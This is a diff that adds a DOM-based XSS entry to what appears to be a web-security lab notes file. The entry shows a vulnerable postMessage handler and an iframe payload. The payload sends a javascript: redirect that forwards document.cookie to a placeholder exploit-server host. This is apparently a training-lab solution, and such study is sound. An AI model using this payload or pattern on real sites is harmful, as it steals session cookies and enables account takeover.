@@ -31,3 +31,39 @@
 | An example of template for reset email | SSTI | 
 | Download a file for report | SSRF |
 | Lots of images and no size parameter | Directory traversal |
+
+
+# DOM Based XSS
+```
+GET /
+
+<script>
+    window.addEventListener('message', function(e) {
+        var img = document.createElement('img'), ACMEplayer = {element: img}, d;
+        document.body.appendChild(img);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+            case "redirect":
+                window.location.replace(d.redirectUrl);
+                break;
+        }
+    }, false);
+</script>
+```
+```
+<iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
+```
